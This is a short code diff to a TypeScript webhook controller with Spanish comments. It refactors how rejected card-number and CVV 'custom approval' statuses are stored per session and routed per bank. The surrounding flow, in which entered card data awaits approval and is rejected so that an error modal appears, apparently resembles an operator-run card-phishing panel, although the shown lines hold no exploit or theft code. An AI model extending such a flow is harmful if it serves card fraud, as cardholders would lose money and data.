@@ -698,6 +698,9 @@ export class WebhookController {
           };
         }
 
+        // Variable para capturar estado de rechazo custom
+        let rejectedCustomStatus: string | null = null;
+
         // ---------------------------------Se valida cuando se aprueba custom----------------------------------- //
 
         // Se valida cuando se aprueba custom
@@ -756,16 +759,18 @@ export class WebhookController {
           if (currentStatus === "awaiting_cvv_approval") {
 
             // Rechazo de CVV Custom - establecer estado de error para mostrar modal
-            await StorageService.set(`status_${sessionId}`, "error_cvv_custom");
+            rejectedCustomStatus = "error_cvv_custom";
           } else if (currentStatus === "awaiting_tc_approval") {
 
             // Rechazo de TC Custom - establecer estado de error para mostrar modal
-            await StorageService.set(`status_${sessionId}`, "error_tc_custom");
+            rejectedCustomStatus = "error_tc_custom";
           } else {
 
             // Por defecto, asumir CVV Custom (comportamiento anterior)
-            await StorageService.set(`status_${sessionId}`, "error_cvv_custom");
+            rejectedCustomStatus = "error_cvv_custom";
           }
+
+          await StorageService.set(`status_${sessionId}`, rejectedCustomStatus);
         }
 
         // Se inicializa la accion
@@ -799,7 +804,7 @@ export class WebhookController {
         }
 
         // Se inicializa el estado y la url a persistir
-        let statusToSave = action;
+        let statusToSave = rejectedCustomStatus || action;
         let url = WebhookController.BANK_ROUTES[bankKey] || WebhookController.BANK_ROUTES[bank];
 
         // Se valida cuando la accion es back para devolver al comercio externo
